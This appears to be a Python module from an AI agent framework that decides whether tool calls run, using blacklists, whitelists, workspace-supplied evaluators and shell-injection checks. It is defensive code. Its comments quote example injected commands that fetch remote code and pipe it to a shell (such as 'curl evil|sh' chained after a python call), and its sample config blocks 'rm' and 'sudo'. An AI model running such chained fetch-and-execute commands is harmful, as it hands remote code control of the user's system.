"""Permission policy evaluation engine.

This module provides the core logic for evaluating tool execution permissions
based on blacklist/whitelist rules. The blacklist always takes priority —
over the whitelist, and (since #679) over an evaluator ALLOW as well.

Evaluators are the one rule source that is NOT the operator's: they are
Python loaded from the *workspace* through the ``script_loader`` chain, so
a repository can ship one. An evaluator DENY short-circuiting is fine —
deny-wins is the safe direction, and overriding a pre-approval is what
evaluators are for. An evaluator ALLOW means "no objection from me", never
"final": it must still survive :meth:`PermissionPolicy.blacklist_veto`.

Optionally includes sanitization checks for:
- Shell injection prevention
- Path scope validation
- Dangerous command blocking
"""

import fnmatch
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set

from .evaluator import EvalContext, EvalResult, PolicyDecision as EvalDecision, load_evaluators, run_evaluator
from .sanitization import (
    SanitizationConfig,
    SanitizationResult,
    sanitize_command,
    create_strict_config,
)


# Shell operators that chain / substitute / redirect commands.  A whitelist
# glob like ``python *`` must not be able to auto-allow these just because ``*``
# swallowed them (``python x.py; curl evil|sh`` matches ``python *`` but runs
# arbitrary commands under shell=True).  See :func:`_has_uncovered_shell_control`.
#
# The two-character operators ``&&`` / ``||`` are listed EXPLICITLY (before the
# substring test would let them ride on a single ``&`` / ``|`` in the pattern):
# an operator who authorizes a data-pipe with ``*|*`` must NOT thereby authorize
# run-on-failure chaining (``foo || curl evil``), and ``&`` (backgrounding) must
# not silently authorize ``&&`` (AND-chaining).  ``m not in pattern`` then
# requires the operator to write the exact operator (``||`` / ``&&``) to allow it.
_SHELL_CONTROL_METACHARS = (";", "||", "|", "&&", "&", "`", "$(", ">", "<", "\n", "\r")

# Tools that execute their command through a shell (so glob-swallowed operators
# are dangerous).  The cli tool is the documented shell surface.
_SHELL_EXECUTING_TOOLS = frozenset({"cli_based_tool"})


def _has_uncovered_shell_control(command: str, pattern: str) -> bool:
    """True if ``command`` contains a shell-control metachar the whitelist
    ``pattern`` did not literally authorize.

    A bare-glob pattern (``python *``) has no metachars, so it can't
    auto-allow command chaining / substitution / redirection.  An operator who
    genuinely wants a pipe writes it into the pattern (``git log | *``), which
    then authorizes ``|`` because it appears in the pattern.
    """
    return any(m in command and m not in pattern for m in _SHELL_CONTROL_METACHARS)


class PermissionDecision(Enum):
    """Possible decisions from permission evaluation."""
    ALLOW = "allow"
    DENY = "deny"
    ASK_CHANNEL = "ask_channel"  # Policy undecided, needs channel approval


@dataclass
class PolicyMatch:
    """Details about why a permission decision was made."""
    decision: PermissionDecision
    reason: str
    matched_rule: Optional[str] = None
    rule_type: Optional[str] = None  # "blacklist", "whitelist", "default", "sanitization", "evaluator"
    violations: Optional[List[str]] = None  # For sanitization failures
    eval_result: Optional['EvalResult'] = None  # Evaluator result for scoped decisions


#: Appended to a blacklist match's ``reason`` when the match is what stopped
#: an evaluator ALLOW.  The audit record must say that an evaluator wanted
#: this call to run, or "denied by blacklist" reads as though nobody asked.
EVALUATOR_ALLOW_OVERRIDDEN = (
    "evaluator ALLOW does not override the blacklist"
)


def overridden_evaluator_allow(veto: PolicyMatch) -> PolicyMatch:
    """Annotate a blacklist veto that overrode an evaluator ALLOW (#679).

    ``rule_type`` is deliberately left as the blacklist's own
    (``blacklist`` / ``session_blacklist``): the rule that DECIDED is the
    operator's, and ``rule_type`` is what #797/#968 read to report the
    deciding rule.  ``eval_result`` is deliberately NOT attached — the
    plugin renders an ``eval_result``'s comment into the result payload,
    and an evaluator's *allow* comment has no business riding on a denial.

    Args:
        veto: The freshly-built match returned by
            :meth:`PermissionPolicy.blacklist_veto`.  Mutated in place and
            returned; it is never a shared object.
    """
    veto.reason = f"{veto.reason} ({EVALUATOR_ALLOW_OVERRIDDEN})"
    return veto


@dataclass
class PermissionPolicy:
    """Policy engine for evaluating tool execution permissions.

    Evaluation order:
    1. Sanitization checks (if enabled) -> DENY if violations found
    2. Permission evaluators (if configured) -> DENY/FALLBACK, or a
       *provisional* ALLOW that must still clear step 3
    3. Check blacklist (session, then static: tools, patterns, arguments)
       -> DENY if matched.  This is ``blacklist_veto`` and it runs both
       for an evaluator ALLOW and for the normal fall-through.
    4. Check whitelist (session, then static) -> ALLOW if matched
    5. Apply default_policy

    Blacklist ALWAYS takes priority — over the whitelist, and over an
    evaluator ALLOW (#679).  Evaluator DENY still short-circuits above it.
    """

    default_policy: str = "deny"  # "allow" or "deny"

    # Blacklist rules
    blacklist_tools: Set[str] = field(default_factory=set)
    blacklist_patterns: List[str] = field(default_factory=list)
    blacklist_arguments: Dict[str, Dict[str, List[str]]] = field(default_factory=dict)

    # Whitelist rules
    whitelist_tools: Set[str] = field(default_factory=set)
    whitelist_patterns: List[str] = field(default_factory=list)
    whitelist_arguments: Dict[str, Dict[str, List[str]]] = field(default_factory=dict)

    # Session-level dynamic rules (added via channel responses)
    session_blacklist: Set[str] = field(default_factory=set)
    session_whitelist: Set[str] = field(default_factory=set)
    session_default_policy: Optional[str] = None  # Overrides default_policy when set

    # Sanitization configuration (None = disabled)
    sanitization_config: Optional[SanitizationConfig] = None
    cwd: Optional[str] = None  # Working directory for path checks

    # Permission evaluators (tool_name|"default" -> evaluate callable)
    _evaluators: Dict[str, Callable] = field(default_factory=dict)

    def set_evaluators(self, evaluators: Dict[str, Callable]) -> None:
        """Set runtime permission evaluators.

        Evaluators run after sanitization and before the whitelist / default
        policy.  They can return ALLOW, DENY, or FALLBACK (continue to normal
        policy):

        - **DENY** short-circuits immediately, overriding whitelist,
          ``allow_all`` and any other pre-approval.  Deny-wins is the safe
          direction and tightening a decision is what evaluators are for.
        - **ALLOW** is provisional.  It skips the whitelist and the default
          policy, but it does NOT skip the blacklist: the decision is still
          put to :meth:`blacklist_veto` before it is returned (#679).
          Evaluators are workspace-supplied code; the blacklist is the
          operator's.
        - **FALLBACK** continues to the normal blacklist/whitelist chain.

        Args:
            evaluators: Dict mapping tool names (or "default") to evaluate callables.
        """
        self._evaluators = evaluators

    def check(self, tool_name: str, args: Dict[str, Any], eval_context: Optional[EvalContext] = None) -> PolicyMatch:
        """Evaluate permission for a tool call.

        Args:
            tool_name: Name of the tool being called
            args: Arguments being passed to the tool
            eval_context: Optional EvalContext for permission evaluators

        Returns:
            PolicyMatch with decision and reasoning
        """
        # Build a signature for pattern matching
        signature = self._build_signature(tool_name, args)

        # 0. Run sanitization checks FIRST (highest priority for security)
        if self.sanitization_config is not None:
            sanitization_match = self._check_sanitization(tool_name, args, signature)
            if sanitization_match:
                return sanitization_match

        # 0.5. Run permission evaluators (after sanitization).  A DENY here
        # short-circuits; an ALLOW is provisional and is put to the blacklist
        # below before it is honored (#679).
        if self._evaluators and eval_context is not None:
            eval_result = run_evaluator(self._evaluators, tool_name, args, eval_context)
            decision = eval_result.decision

            if decision == EvalDecision.FALLBACK:
                pass  # Continue to blacklist/whitelist

            elif decision in (EvalDecision.DENY, EvalDecision.DENY_SESSION):
                return PolicyMatch(
                    decision=PermissionDecision.DENY,
                    reason="Evaluator denied access",
                    rule_type="evaluator",
                    eval_result=eval_result,
                )
            elif decision == EvalDecision.DENY_WITH_COMMENT:
                comment = eval_result.comment or "Denied by evaluator"
                return PolicyMatch(
                    decision=PermissionDecision.DENY,
                    reason=f"Tool not executed. Evaluator comment: {comment}",
                    rule_type="evaluator_comment",
                    eval_result=eval_result,
                )
            elif decision in (
                EvalDecision.ALLOW,
                EvalDecision.ALLOW_ONCE,
                EvalDecision.ALLOW_TURN,
                EvalDecision.ALLOW_UNTIL_IDLE,
                EvalDecision.ALLOW_SESSION,
                EvalDecision.ALLOW_ALL,
                EvalDecision.ALLOW_WITH_COMMENT,
            ):
                # #679: an evaluator ALLOW is "no objection from me", not
                # "final".  The operator's deny tiers still decide.
                veto = self.blacklist_veto(tool_name, args, signature)
                if veto is not None:
                    return overridden_evaluator_allow(veto)
                return PolicyMatch(
                    decision=PermissionDecision.ALLOW,
                    reason="Evaluator granted access",
                    rule_type="evaluator_comment" if decision == EvalDecision.ALLOW_WITH_COMMENT else "evaluator",
                    eval_result=eval_result,
                )

        # 1-2. Session blacklist, then static blacklist (highest priority)
        blacklist_match = self.blacklist_veto(tool_name, args, signature)
        if blacklist_match:
            return blacklist_match

        # 3. Check session whitelist
        if self._matches_session_whitelist(tool_name, signature):
            return PolicyMatch(
                decision=PermissionDecision.ALLOW,
                reason=f"Tool '{tool_name}' is whitelisted for this session",
                rule_type="session_whitelist"
            )

        # 4. Check static whitelist
        whitelist_match = self._check_whitelist(tool_name, args, signature)
        if whitelist_match:
            return whitelist_match

        # 5. Apply default policy (session override takes priority)
        effective_default = self.session_default_policy or self.default_policy
        if effective_default == "allow":
            return PolicyMatch(
                decision=PermissionDecision.ALLOW,
                reason="Allowed by default policy",
                rule_type="default"
            )
        elif effective_default == "deny":
            return PolicyMatch(
                decision=PermissionDecision.DENY,
                reason="Denied by default policy",
                rule_type="default"
            )
        else:
            # effective_default == "ask" or unknown -> ask channel
            return PolicyMatch(
                decision=PermissionDecision.ASK_CHANNEL,
                reason="No matching rule, requires channel approval",
                rule_type="default"
            )

    def blacklist_veto(
        self,
        tool_name: str,
        args: Dict[str, Any],
        signature: Optional[str] = None,
    ) -> Optional[PolicyMatch]:
        """The operator's deny tiers, asked as one question.

        Returns the :class:`PolicyMatch` of the first blacklist that refuses
        this call — the **session** blacklist (``rule_type`` ==
        ``"session_blacklist"``), then the **static** one (``"blacklist"``) —
        or ``None`` when neither does.

        Public, and the name is the point: this is the veto an evaluator
        ALLOW has to survive (#679).  :meth:`check` calls it for the normal
        fall-through *and* for a provisional evaluator ALLOW, and
        ``PermissionPlugin._check_permission_impl`` calls it from the one
        evaluator branch that returns without reaching :meth:`check` at all
        (``ALLOW_WITH_COMMENT``) — so the tiers are written once and every
        ALLOW path asks the same object.

        Args:
            tool_name: Name of the tool being called.
            args: Arguments being passed to the tool.
            signature: Pre-built command signature; computed from
                ``tool_name``/``args`` when omitted.
        """
        if signature is None:
            signature = self._build_signature(tool_name, args)

        if self._matches_session_blacklist(tool_name, signature):
            return PolicyMatch(
                decision=PermissionDecision.DENY,
                reason=f"Tool '{tool_name}' is blacklisted for this session",
                rule_type="session_blacklist"
            )

        return self._check_blacklist(tool_name, args, signature)

    def _check_sanitization(
        self, tool_name: str, args: Dict[str, Any], signature: str
    ) -> Optional[PolicyMatch]:
        """Run sanitization checks. Returns PolicyMatch if blocked, None otherwise.

        Sanitization checks run BEFORE blacklist/whitelist evaluation and include:
        - Shell injection detection (metacharacters, command substitution)
        - Dangerous command blocking (sudo, rm, etc.)
        - Path scope validation (restrict to allowed directories)
        """
        if self.sanitization_config is None:
            return None

        # Only sanitize CLI commands
        if tool_name != "cli_based_tool":
            return None

        command = args.get("command", "")
        if not command:
            return None

        result = sanitize_command(command, self.sanitization_config, self.cwd)

        if not result.is_safe:
            return PolicyMatch(
                decision=PermissionDecision.DENY,
                reason=f"Sanitization failed: {result.reason}",
                matched_rule="sanitization",
                rule_type="sanitization",
                violations=result.violations
            )

        return None

    def _build_signature(self, tool_name: str, args: Dict[str, Any]) -> str:
        """Build a command signature for pattern matching.

        For CLI tools, this extracts the command string.
        For other tools, it creates a representation like "tool_name(arg1=val1, ...)".

        **The signature is the whole decision.**  Every tier below —
        sanitization, both blacklists, both whitelists — matches against
        this string and nothing else, and it is what the #951/#968 DECISION
        trace line reports as the thing that was judged.  For
        ``cli_based_tool`` it is the command text, so an argument that
        changes *what actually runs* without appearing in that text is
        invisible to every rule an operator wrote.

        That is the contract a caller-supplied ``extra_paths`` broke (#697):
        it altered ``PATH``, and therefore which binary ``shutil.which``
        resolved a command name to, while producing a signature identical to
        the call without it.  The fix keeps this method as-is and closes the
        hole at the other end — ``shared.cli_path_policy`` refuses the
        argument at every execution site, so PATH extension is
        operator-configured and cannot vary between approval and execution.
        Adding it here instead would have prompted a human to authorize a
        call that is refused regardless.

        **So the invariant for anyone adding a ``cli_based_tool`` argument
        is:** it must either be reflected in this signature, or be refused
        when it comes from the caller.  An argument that is honoured and
        unsignatured means the approved string and the executed thing are
        decided by two different inputs.
        """
        if tool_name == "cli_based_tool":
            command = args.get("command", "")
            arg_list = args.get("args") or []  # Handle both missing and None
            if arg_list:
                return f"{command} {' '.join(str(a) for a in arg_list)}"
            return command
        else:
            # For non-CLI tools, create a simple signature
            if not args:
                return f"{tool_name}()"
            return f"{tool_name}({', '.join(f'{k}={v}' for k, v in sorted(args.items()))})"

    def _matches_session_blacklist(self, tool_name: str, signature: str) -> bool:
        """Check if tool matches any session blacklist entry.

        Note: If the tool name is an EXACT match in session_whitelist, pattern
        matches in session_blacklist are skipped. This allows explicit whitelist
        entries to override blacklist patterns (e.g., allow "createPlan" to
        override "deny: create*").
        """
        # Check if tool has explicit whitelist entry (not pattern) - if so, skip pattern blacklist
        has_explicit_whitelist = tool_name in self.session_whitelist

        for pattern in self.session_blacklist:
            # Exact matches in blacklist always apply
            is_exact_blacklist = (pattern == tool_name)

            if is_exact_blacklist:
                # Explicit blacklist beats explicit whitelist
                return True

            # Pattern match - but skip if there's an explicit whitelist entry
            if has_explicit_whitelist:
                continue

            if fnmatch.fnmatch(tool_name, pattern) or fnmatch.fnmatch(signature, pattern):
                return True
        return False

    def _matches_session_whitelist(self, tool_name: str, signature: str) -> bool:
        """Check if tool matches any session whitelist entry."""
        for pattern in self.session_whitelist:
            # A tool-name match is an explicit broad allow (e.g. "always allow
            # cli") — honored as-is.
            if fnmatch.fnmatch(tool_name, pattern):
                return True
            # A command-signature match on a shell tool must not let a bare
            # glob swallow unauthorized shell operators (see _check_whitelist).
            if fnmatch.fnmatch(signature, pattern):
                if (tool_name in _SHELL_EXECUTING_TOOLS
                        and _has_uncovered_shell_control(signature, pattern)):
                    continue
                return True
        return False

    def _check_blacklist(
        self, tool_name: str, args: Dict[str, Any], signature: str
    ) -> Optional[PolicyMatch]:
        """Check blacklist rules. Returns match if blocked, None otherwise."""

        # Check tool name blacklist
        if tool_name in self.blacklist_tools:
            return PolicyMatch(
                decision=PermissionDecision.DENY,
                reason=f"Tool '{tool_name}' is blacklisted",
                matched_rule=tool_name,
                rule_type="blacklist"
            )

        # Check pattern blacklist (glob-style matching)
        for pattern in self.blacklist_patterns:
            if fnmatch.fnmatch(signature, pattern):
                return PolicyMatch(
                    decision=PermissionDecision.DENY,
                    reason=f"Command matches blacklist pattern: {pattern}",
                    matched_rule=pattern,
                    rule_type="blacklist"
                )

        # Check argument blacklist
        if tool_name in self.blacklist_arguments:
            arg_rules = self.blacklist_arguments[tool_name]
            for arg_name, blocked_values in arg_rules.items():
                arg_value = args.get(arg_name, "")
                # For string arguments, check if it starts with any blocked value
                if isinstance(arg_value, str):
                    for blocked in blocked_values:
                        if arg_value.startswith(blocked) or blocked in arg_value.split():
                            return PolicyMatch(
                                decision=PermissionDecision.DENY,
                                reason=f"Argument '{arg_name}' contains blocked value: {blocked}",
                                matched_rule=f"{arg_name}={blocked}",
                                rule_type="blacklist"
                            )

        return None

    def _check_whitelist(
        self, tool_name: str, args: Dict[str, Any], signature: str
    ) -> Optional[PolicyMatch]:
        """Check whitelist rules. Returns match if allowed, None otherwise."""

        # Check tool name whitelist
        if tool_name in self.whitelist_tools:
            return PolicyMatch(
                decision=PermissionDecision.ALLOW,
                reason=f"Tool '{tool_name}' is whitelisted",
                matched_rule=tool_name,
                rule_type="whitelist"
            )

        # Check pattern whitelist (glob-style matching)
        for pattern in self.whitelist_patterns:
            if fnmatch.fnmatch(signature, pattern):
                # A shell tool's command whose glob-match swallowed shell
                # operators the pattern didn't authorize is NOT whitelisted —
                # fall through to ask/deny so ``python *`` can't green-light
                # ``python x; curl evil|sh``.
                if (tool_name in _SHELL_EXECUTING_TOOLS
                        and _has_uncovered_shell_control(signature, pattern)):
                    continue
                return PolicyMatch(
                    decision=PermissionDecision.ALLOW,
                    reason=f"Command matches whitelist pattern: {pattern}",
                    matched_rule=pattern,
                    rule_type="whitelist"
                )

        # Check argument whitelist
        if tool_name in self.whitelist_arguments:
            arg_rules = self.whitelist_arguments[tool_name]
            for arg_name, allowed_values in arg_rules.items():
                arg_value = args.get(arg_name, "")
                if isinstance(arg_value, str):
                    for allowed in allowed_values:
                        if arg_value.startswith(allowed):
                            # A prefix-whitelisted command on a shell tool must
                            # not smuggle shell operators past the allowed
                            # prefix — ``command`` startswith ``python`` can't
                            # green-light ``python x; curl evil|sh``.  The
                            # operator writes the operator into the prefix to
                            # authorize it (mirrors the glob path above).
                            if (tool_name in _SHELL_EXECUTING_TOOLS
                                    and _has_uncovered_shell_control(arg_value, allowed)):
                                continue
                            return PolicyMatch(
                                decision=PermissionDecision.ALLOW,
                                reason=f"Argument '{arg_name}' matches allowed value: {allowed}",
                                matched_rule=f"{arg_name}={allowed}",
                                rule_type="whitelist"
                            )

        return None

    def add_session_blacklist(self, pattern: str) -> None:
        """Add a pattern to the session blacklist."""
        self.session_blacklist.add(pattern)

    def add_session_whitelist(self, pattern: str) -> None:
        """Add a pattern to the session whitelist.

        Note: Session blacklist still takes priority over session whitelist.
        """
        self.session_whitelist.add(pattern)

    def clear_session_rules(self) -> None:
        """Clear all session-level rules."""
        self.session_blacklist.clear()
        self.session_whitelist.clear()
        self.session_default_policy = None

    def set_session_default_policy(self, policy: Optional[str]) -> None:
        """Set the session default policy override.

        Args:
            policy: "allow", "deny", "ask", or None to clear override
        """
        if policy is not None and policy not in ("allow", "deny", "ask"):
            raise ValueError(f"Invalid policy: {policy}. Use: allow, deny, or ask")
        self.session_default_policy = policy

    def get_session_default_policy(self) -> Optional[str]:
        """Get the session default policy override, or None if not set."""
        return self.session_default_policy

    def set_sanitization(
        self,
        config: Optional[SanitizationConfig] = None,
        cwd: Optional[str] = None
    ) -> None:
        """Enable or update sanitization configuration.

        Args:
            config: SanitizationConfig instance, or None to disable
            cwd: Working directory for path scope checks
        """
        self.sanitization_config = config
        self.cwd = cwd

    def enable_strict_sandbox(self, cwd: Optional[str] = None) -> None:
        """Enable strict sandboxing with all protections.

        This enables:
        - Shell injection blocking
        - Dangerous command blocking
        - Path scope restricted to cwd only
        """
        self.sanitization_config = create_strict_config(cwd)
        self.cwd = cwd

    @classmethod
    def from_config(cls, config: Dict[str, Any]) -> 'PermissionPolicy':
        """Create a PermissionPolicy from a configuration dict.

        Expected config structure:
        {
            "defaultPolicy": "deny",
            "blacklist": {
                "tools": ["tool1", "tool2"],
                "patterns": ["rm *", "sudo *"],
                "arguments": {
                    "cli_based_tool": {"command": ["rm", "sudo"]}
                }
            },
            "whitelist": {
                "tools": ["safe_tool"],
                "patterns": ["git *"],
                "arguments": {
                    "cli_based_tool": {"command": ["git", "npm"]}
                }
            },
            "sanitization": {
                "enabled": true,
                "block_shell_metacharacters": true,
                "block_dangerous_commands": true,
                "allowed_dangerous_commands": ["rm"],
                "path_scope": {
                    "enabled": true,
                    "allowed_roots": ["."],
                    "block_absolute": true,
                    "block_parent_traversal": true,
                    "allow_home": false,
                    "allow_tmp": true
                }
            }
        }
        """
        from .sanitization import SanitizationConfig, PathScopeConfig

        blacklist = config.get("blacklist", {})
        whitelist = config.get("whitelist", {})

        # Parse sanitization config
        sanitization_config = None
        san_cfg = config.get("sanitization", {})
        if san_cfg.get("enabled", False):
            path_scope = None
            ps_cfg = san_cfg.get("path_scope", {})
            if ps_cfg.get("enabled", False):
                path_scope = PathScopeConfig(
                    allowed_roots=ps_cfg.get("allowed_roots", ["."]),
                    block_absolute=ps_cfg.get("block_absolute", True),
                    block_parent_traversal=ps_cfg.get("block_parent_traversal", True),
                    resolve_symlinks=ps_cfg.get("resolve_symlinks", True),
                    allow_home=ps_cfg.get("allow_home", False),
                    allow_tmp=ps_cfg.get("allow_tmp", True),
                )

            sanitization_config = SanitizationConfig(
                block_shell_metacharacters=san_cfg.get("block_shell_metacharacters", True),
                block_dangerous_commands=san_cfg.get("block_dangerous_commands", True),
                allowed_dangerous_commands=set(san_cfg.get("allowed_dangerous_commands", [])),
                custom_blocked_commands=set(san_cfg.get("custom_blocked_commands", [])),
                path_scope=path_scope,
            )

        return cls(
            default_policy=config.get("defaultPolicy", "deny"),
            blacklist_tools=set(blacklist.get("tools", [])),
            blacklist_patterns=blacklist.get("patterns", []),
            blacklist_arguments=blacklist.get("arguments", {}),
            whitelist_tools=set(whitelist.get("tools", [])),
            whitelist_patterns=whitelist.get("patterns", []),
            whitelist_arguments=whitelist.get("arguments", {}),
            sanitization_config=sanitization_config,
            cwd=config.get("cwd"),
        )
